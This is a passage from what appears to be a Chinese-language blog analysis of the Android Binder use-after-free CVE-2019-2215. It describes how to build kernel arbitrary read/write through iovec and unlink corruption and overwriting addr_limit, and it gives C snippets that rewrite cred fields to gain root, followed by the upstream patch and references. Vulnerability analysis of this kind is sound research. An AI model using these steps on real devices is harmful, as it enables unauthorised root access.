<span class=ln> 3</span>        <span class=n>next</span><span class=o>-&gt;</span><span class=n>prev</span> <span class=o>=</span> <span class=n>prev</span><span class=p>;</span>
<span class=ln> 4</span>        <span class=n>WRITE_ONCE</span><span class=p>(</span><span class=n>prev</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>,</span> <span class=n>next</span><span class=p>);</span>
<span class=ln> 5</span><span class=p>}</span>
<span class=ln> 6</span>
<span class=ln> 7</span><span class=cp>#ifndef CONFIG_DEBUG_LIST
</span><span class=ln> 8</span><span class=cp></span><span class=p>...</span>
<span class=ln> 9</span><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=n>list_del</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span><span class=n>entry</span><span class=p>)</span>
<span class=ln>10</span><span class=p>{</span>
<span class=ln>11</span>        <span class=n>__list_del</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>prev</span><span class=p>,</span> <span class=n>entry</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>);</span>
<span class=ln>12</span>        <span class=n>entry</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=n>LIST_POISON1</span><span class=p>;</span>
<span class=ln>13</span>        <span class=n>entry</span><span class=o>-&gt;</span><span class=n>prev</span> <span class=o>=</span> <span class=n>LIST_POISON2</span><span class=p>;</span>
<span class=ln>14</span><span class=p>}</span>
</code></pre></div><p>经过这些步骤我们成功将iovec数组中的<code>iovec[10].iov_len</code>和<code>iovec[11].iov_base</code>的地址修改为了<code>binder_thread+0xA8</code>的地址，这样之后我们从<code>writev</code>写入的缓冲区中（在POC中为pipe管道）就可以读出<code>binder_thread+0xA8</code>之后的内容了，而其中位于<code>binder_thread+0x190</code>的<code>task_struct</code>指针地址就可以成功被我们读到。在此之前我们需要从pipe中读取原来<code>iovec[10].iov_base</code>中长度为<code>0x1000</code>的内容。</p><p>这里可能容易不清楚的地方是<code>iovec[10].iov_len</code>的值不是已经被修改为地址了吗，为什么还是只需要读1个page。其实在调用writev的时候，已经将<code>iovec[10].iov_base</code>中的内容写进了pipe，所以此时在vectored IO已经将<code>iovec[10]</code>中的内容写完了，切换到<code>iovec[11]</code>。同时由于一开始将pipe的大小设置为0x1000，所以<code>writev</code>向pipe中写入<code>iovec[10]</code>的内容后管道会被阻塞，当子线程从管道中读取数据后writev才会继续向管道内写入<code>iovec[11]</code>的数据。</p><h3 id=实现任意地址读写>实现任意地址读写</h3><p><code>task_struct</code>是一个进程控制块(PCB)结构体，其中存储了很多进程线程的信息，操作系统通过管理这些信息来实现对进程线程的操作。在泄露<code>binder_thead.task</code>的地址后我们可以通过覆盖<code>task.thread_info.addr_limit</code>字段来实现对整个内存空间（用户空间和内核空间）的读写。</p><p>使用上一节的方法，我们可以去控制<code>binder_thread+0xA8</code>之后除了<code>task</code>的内容，和如何使用unlink将<code>binder_thread+0xA8</code>的地址写到<code>binder_thread+0xA8</code>和<code>binder_thread+0xB0</code>上。接下来我们要做的就是在此基础上去实现对目标地址(<code>task.thread_info.addr_limit</code>)的写操作。其思路就是：</p><ol><li>故技重施，将iovec数组的内容拷贝到chunk中；</li><li>使用unlink将<code>iovec[11].iov_base</code>修改为<code>binder_thread+0xA8</code>；</li><li>通过对iovec的写操作(使用<code>recvmsg</code>)，向<code>iovec[11]</code>写入构造好的新的iovec内容，使得<code>iovec[12].iov_base</code>指向目标地址；</li><li>继续向iovec中写入想要修改的值，达到修改目标地址内容的目的。</li></ol><p>我们使用<code>recvmsg</code>来完成以上的目标，这里不使用<code>readv</code>的一个主要原因可能是<code>readv</code>可能并不会等待所有数据读取完成，而直接返回，这会造成没有成功覆盖<code>addr_limit</code>；而使用<code>MSG_WAITALL</code>的<code>recvmsg</code>会等待将所有输入读取完成后才返回。</p><p>在上述的第一步中，我们构造如下一个iovec数组，来reallocate和覆盖内核中的<code>binder_thread</code>结构体（省略号表示的其他iovec字段均为0）：
<img src=https://xylearn-cloud-img.oss-accelerate.aliyuncs.com/img/cve-201902215-write-write1-2020-11-19-22.png alt></p><p>在第二步之前先向socket写入一个字节数据来跳过<code>iovec[10]</code>，使得<code>iov_iter</code>中的<code>iov_offset</code>指向<code>iovec[11]</code>。之后我们故技重施从队列中删除一个list entry来触发unlink，触发unlink后的iovec数组布局如下：
<img src=https://xylearn-cloud-img.oss-accelerate.aliyuncs.com/img/cve-201902215-write-unlink-2020-11-19-22.png alt></p><p>接着在第三步中我们构造一个新的iovec数组，这个数组会被写入<code>binder_thread+0xA8</code>，因为<code>iovec[11].iov_base</code>已经通过unlink被修改为了<code>binder_thread+0xA8</code>，在构造的payload中，我们将<code>iovec[12].iov_base</code>修改为我们要写的目标地址，即addr_limit的地址，这个地址可以通过<code>task_struct</code>的地址算出。在第三步后的iovec数组布局如下：
<img src=https://xylearn-cloud-img.oss-accelerate.aliyuncs.com/img/cve-201902215-write-write2-2020-11.png alt></p><p>在第四步中，我们向目标地址写入我们想写的内容。对于addr_limit，我们将它修改为<code>0xFFFFFFFFFFFFFFFE</code>就可以达到任意地址读写的目的，修改完成后内存的布局如下：。</p><p><img src=https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/mUVrk5-2020-11.png alt></p><p>此时我们已经可以读写内核中的任意地址了。</p><h3 id=提权>提权</h3><p>有了内核的任意地址读写能力，那么实现提权就手到擒来了。
可以通过修改<code>task_struct</code>中的<code>cred</code>字段来实现进程权限提升</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=k>struct</span> <span class=n>cred</span> <span class=p>{</span>
<span class=ln> 2</span>	<span class=n>atomic_t</span>	<span class=n>usage</span><span class=p>;</span>
<span class=ln> 3</span><span class=cp>#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span class=ln> 4</span><span class=cp></span>	<span class=n>atomic_t</span>	<span class=n>subscribers</span><span class=p>;</span>	<span class=cm>/* number of processes subscribed */</span>
<span class=ln> 5</span>	<span class=kt>void</span>		<span class=o>*</span><span class=n>put_addr</span><span class=p>;</span>
<span class=ln> 6</span>	<span class=kt>unsigned</span>	<span class=n>magic</span><span class=p>;</span>
<span class=ln> 7</span><span class=cp>#define CRED_MAGIC	0x43736564
</span><span class=ln> 8</span><span class=cp>#define CRED_MAGIC_DEAD	0x44656144
</span><span class=ln> 9</span><span class=cp>#endif
</span><span class=ln>10</span><span class=cp></span>	<span class=n>kuid_t</span>		<span class=n>uid</span><span class=p>;</span>		<span class=cm>/* real UID of the task */</span>
<span class=ln>11</span>	<span class=n>kgid_t</span>		<span class=n>gid</span><span class=p>;</span>		<span class=cm>/* real GID of the task */</span>
<span class=ln>12</span>	<span class=n>kuid_t</span>		<span class=n>suid</span><span class=p>;</span>		<span class=cm>/* saved UID of the task */</span>
<span class=ln>13</span>	<span class=n>kgid_t</span>		<span class=n>sgid</span><span class=p>;</span>		<span class=cm>/* saved GID of the task */</span>
<span class=ln>14</span>	<span class=n>kuid_t</span>		<span class=n>euid</span><span class=p>;</span>		<span class=cm>/* effective UID of the task */</span>
<span class=ln>15</span>	<span class=n>kgid_t</span>		<span class=n>egid</span><span class=p>;</span>		<span class=cm>/* effective GID of the task */</span>
<span class=ln>16</span>	<span class=n>kuid_t</span>		<span class=n>fsuid</span><span class=p>;</span>		<span class=cm>/* UID for VFS ops */</span>
<span class=ln>17</span>	<span class=n>kgid_t</span>		<span class=n>fsgid</span><span class=p>;</span>		<span class=cm>/* GID for VFS ops */</span>
<span class=ln>18</span>	<span class=kt>unsigned</span>	<span class=n>securebits</span><span class=p>;</span>	<span class=cm>/* SUID-less security management */</span>
<span class=ln>19</span>	<span class=n>kernel_cap_t</span>	<span class=n>cap_inheritable</span><span class=p>;</span> <span class=cm>/* caps our children can inherit */</span>
<span class=ln>20</span>	<span class=n>kernel_cap_t</span>	<span class=n>cap_permitted</span><span class=p>;</span>	<span class=cm>/* caps we&#39;re permitted */</span>
<span class=ln>21</span>	<span class=n>kernel_cap_t</span>	<span class=n>cap_effective</span><span class=p>;</span>	<span class=cm>/* caps we can actually use */</span>
<span class=ln>22</span>	<span class=n>kernel_cap_t</span>	<span class=n>cap_bset</span><span class=p>;</span>	<span class=cm>/* capability bounding set */</span>
<span class=ln>23</span>	<span class=n>kernel_cap_t</span>	<span class=n>cap_ambient</span><span class=p>;</span>	<span class=cm>/* Ambient capability set */</span>
<span class=ln>24</span><span class=cp>#ifdef CONFIG_KEYS
</span><span class=ln>25</span><span class=cp></span>	<span class=kt>unsigned</span> <span class=kt>char</span>	<span class=n>jit_keyring</span><span class=p>;</span>	<span class=cm>/* default keyring to attach requested
</span><span class=ln>26</span><span class=cm>					 * keys to */</span>
<span class=ln>27</span>	<span class=k>struct</span> <span class=n>key</span> <span class=n>__rcu</span> <span class=o>*</span><span class=n>session_keyring</span><span class=p>;</span> <span class=cm>/* keyring inherited over fork */</span>
<span class=ln>28</span>	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>process_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this process */</span>
<span class=ln>29</span>	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>thread_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this thread */</span>
<span class=ln>30</span>	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>request_key_auth</span><span class=p>;</span> <span class=cm>/* assumed request_key authority */</span>
<span class=ln>31</span><span class=cp>#endif
</span><span class=ln>32</span><span class=cp>#ifdef CONFIG_SECURITY
</span><span class=ln>33</span><span class=cp></span>	<span class=kt>void</span>		<span class=o>*</span><span class=n>security</span><span class=p>;</span>	<span class=cm>/* subjective LSM security */</span>
<span class=ln>34</span><span class=cp>#endif
</span><span class=ln>35</span><span class=cp></span>	<span class=k>struct</span> <span class=n>user_struct</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span>	<span class=cm>/* real user ID subscription */</span>
<span class=ln>36</span>	<span class=k>struct</span> <span class=n>user_namespace</span> <span class=o>*</span><span class=n>user_ns</span><span class=p>;</span> <span class=cm>/* user_ns the caps and keyrings are relative to. */</span>
<span class=ln>37</span>	<span class=k>struct</span> <span class=n>group_info</span> <span class=o>*</span><span class=n>group_info</span><span class=p>;</span>	<span class=cm>/* supplementary groups for euid/fsgid */</span>
<span class=ln>38</span>	<span class=k>struct</span> <span class=n>rcu_head</span>	<span class=n>rcu</span><span class=p>;</span>		<span class=cm>/* RCU deletion hook */</span>
<span class=ln>39</span><span class=p>};</span>
</code></pre></div><p>首先获取<code>task</code>中<code>cred</code>和<code>security</code>的地址</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln>1</span>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>my_cred</span> <span class=o>=</span> <span class=n>kernel_read_ulong</span><span class=p>(</span><span class=n>current_ptr</span> <span class=o>+</span> <span class=n>OFFSET__task_struct__cred</span><span class=p>);</span>
<span class=ln>2</span>  <span class=c1>// offset 0x78 is pointer to void * security
</span><span class=ln>3</span><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>current_cred_security</span> <span class=o>=</span> <span class=n>kernel_read_ulong</span><span class=p>(</span><span class=n>my_cred</span><span class=o>+</span><span class=mh>0x78</span><span class=p>);</span>
</code></pre></div><p>然后将<code>cred</code>中的各种ID改成root ID(0)，重置<code>cred.securebits</code>，并且将各种capability打开，此时已经可以用root权限执行任意代码了。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln>1</span>  <span class=c1>// change IDs to root (there are eight)
</span><span class=ln>2</span><span class=c1></span>  <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
<span class=ln>3</span>    <span class=n>kernel_write_uint</span><span class=p>(</span><span class=n>my_cred</span><span class=o>+</span><span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
<span class=ln>4</span>  <span class=c1>// reset securebits
</span><span class=ln>5</span><span class=c1></span>  <span class=n>kernel_write_uint</span><span class=p>(</span><span class=n>my_cred</span><span class=o>+</span><span class=mh>0x24</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
<span class=ln>6</span>  <span class=c1>// change capabilities to everything (perm, effective, bounding)
</span><span class=ln>7</span><span class=c1></span>  <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
<span class=ln>8</span>    <span class=n>kernel_write_ulong</span><span class=p>(</span><span class=n>my_cred</span><span class=o>+</span><span class=mh>0x30</span> <span class=o>+</span> <span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=mh>0x3fffffffffUL</span><span class=p>);</span>
</code></pre></div><p>当然我们可以进一步取消SELINUX限制，获取init权限，关闭SECCOMP等。</p><h2 id=漏洞修复>漏洞修复</h2><p>在Google发布的<a href=https://android.googlesource.com/kernel/msm/+/550c01d0e051461437d6e9d72f573759e7bc5047%5E%21/#F0>补丁</a>中修复了CVE-2019-2215漏洞。其patch如下</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=n>diff</span> <span class=o>--</span><span class=n>git</span> <span class=n>a</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span> <span class=n>b</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
<span class=ln> 2</span><span class=n>index</span> <span class=mi>6</span><span class=n>b4a991</span><span class=p>..</span><span class=n>bb48a7b</span> <span class=mi>100644</span>
<span class=ln> 3</span><span class=o>---</span> <span class=n>a</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
<span class=ln> 4</span><span class=o>+++</span> <span class=n>b</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
<span class=ln> 5</span><span class=err>@@</span> <span class=o>-</span><span class=mi>4535</span><span class=p>,</span><span class=mi>6</span> <span class=o>+</span><span class=mi>4535</span><span class=p>,</span><span class=mi>18</span> <span class=err>@@</span>
<span class=ln> 6</span> 		<span class=k>if</span> <span class=p>(</span><span class=n>t</span><span class=p>)</span>
<span class=ln> 7</span> 			<span class=n>spin_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>t</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span>
<span class=ln> 8</span> 	<span class=p>}</span>
<span class=ln> 9</span><span class=o>+</span>
<span class=ln>10</span><span class=o>+</span>	<span class=cm>/*
</span><span class=ln>11</span><span class=cm>+	 * If this thread used poll, make sure we remove the waitqueue
</span><span class=ln>12</span><span class=cm>+	 * from any epoll data structures holding it with POLLFREE.
</span><span class=ln>13</span><span class=cm>+	 * waitqueue_active() is safe to use here because we&#39;re holding
</span><span class=ln>14</span><span class=cm>+	 * the inner lock.
</span><span class=ln>15</span><span class=cm>+	 */</span>
<span class=ln>16</span><span class=o>+</span>	<span class=k>if</span> <span class=p>((</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>looper</span> <span class=o>&amp;</span> <span class=n>BINDER_LOOPER_STATE_POLL</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
<span class=ln>17</span><span class=o>+</span>	    <span class=n>waitqueue_active</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>))</span> <span class=p>{</span>
<span class=ln>18</span><span class=o>+</span>		<span class=n>wake_up_poll</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>,</span> <span class=n>POLLHUP</span> <span class=o>|</span> <span class=n>POLLFREE</span><span class=p>);</span>
<span class=ln>19</span><span class=o>+</span>	<span class=p>}</span>
<span class=ln>20</span><span class=o>+</span>
<span class=ln>21</span> 	<span class=n>binder_inner_proc_unlock</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>proc</span><span class=p>);</span>
<span class=ln>22</span> 
<span class=ln>23</span> 	<span class=k>if</span> <span class=p>(</span><span class=n>send_reply</span><span class=p>)</span>
</code></pre></div><p>这个patch位于<code>binder_thread_release</code>接近函数末尾的位置。Patch主要增加了一个if条件检查，判断的第一部分<code>thread->looper & BINDER_LOOPER_STATE_POLL</code>检查<code>binder_thread</code>是否调用了<code>binder_poll</code>，第二部分<code>waitqueue_active(&thread->wait)</code>实际上检查了<code>wait</code>是否是一个空队列。如果<code>binder_thread</code>调用了<code>binder_poll</code>并且<code>wait</code>是一个空队列，那么将调用<code>wake_up_poll</code>来释放<code>wait</code>队列从而避免UAF。Patch中的注视说明了由于此处线程拥有对<code>wait</code>的锁，所以调用<code>waitqueue_active</code>判断队列是否为空是安全的（不存在脏读）。</p><h2 id=总结>总结</h2><p>CVE-2019-2215是一个典型的kernel memory corruption漏洞，其原因是有效指针指向了内核中无效的堆内存区域。这个漏洞能造成严重的攻击后果，可以造成本地提权和内核的任意地址读写，并且这个漏洞利用简单，不需要依赖于用户操作或是更多的环境配置。这个漏洞于2017年被发现，在2018年2月被Google修复，但是这个漏洞没有被包含在Android的每月安全更新包中，所以在当时很多已发布的Pixel 1和2设备仍然会受到这个漏洞影响。这也从一个角度揭示了开源软件中多分支给安全Patch带来了比较大的麻烦。</p><p>从这个漏洞的利用过程中我们可以学习到Linux Kernel Pwn的常用思路。但是Android Kernel调试环境的配置和搭建要难于普通内核的调试环境搭建，这给复现和学习带来了一定的困难。目前还没有成功在模拟器或是真机上成功复现这一漏洞，因为一方面很难找到一个有漏洞版本的安卓Image，另一方面尚未成功针对目标设备或模拟器虚拟设备编译出一个能够正常运行的有漏洞版本的kernel image。</p><h2 id=参考链接>参考链接</h2><ul><li><a href=https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html>Bad Binder: Android In-The-Wild Exploit</a></li><li><a href=https://www.4hou.com/posts/B1VJ>Android Binder Driver UAF 漏洞实现 Root 提权分析（CVE-2019-2215）</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">Issue 1942: Android: Use-After-Free in Binder driver</a></li><li><a href=https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ>KASAN: use-after-free Read in __lock_acquire (2)</a></li><li><a href=https://xz.aliyun.com/t/6853>CVE-2019-2215—android内核binder漏洞分析(2)</a></li><li><a href="https://source.android.com/devices/tech/debug/kasan-kcov?hl=zh-cn">使用 KASAN+KCOV 编译 Pixel 内核</a></li><li><a href=https://blog.csdn.net/zhangjg_blog/article/details/84291663>使用Android模拟器调试linux内核</a></li><li><a href=https://github.com/grant-h/qu1ckr00t>Github grant-h/qu1ckr00t</a></li><li><a href=https://github.com/kangtastic/cve-2019-2215>Github kangtastic/cve-2019-2215</a></li><li><a href=https://github.com/timwr/CVE-2019-2215>Github timwr/CVE-2019-2215</a></li></ul></div><footer class=post-footer></footer></article><script type=text/javascript>if(!/(iPhone|iPad|iPod|iOS|Android)/i.test(navigator.userAgent)){tocbot.init({tocSelector:'.post-toc',contentSelector:'.post-content',headingSelector:'h1, h2, h3, h4',positionFixedSelector:'.post-toc',positionFixedClass:'is-position-fixed',fixedSidebarOffset:'auto',scrollSmooth:true,});}</script></main><footer class=footer><span>&copy; 2021 <a href=https://blog.xylearn.site/public/>XYlearn' Site</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>️</span>
<span>&#183;</span>
<span>Theme️ <a href=https://github.com/nanxiaobei/hugo-paper rel=noopener target=_blank>Paper</a></span></footer><script src=https://blog.xylearn.site/public/highlight.min.js></script><script>hljs.initHighlightingOnLoad();</script><script src=https://blog.xylearn.site/public/copy.js></script></body></html>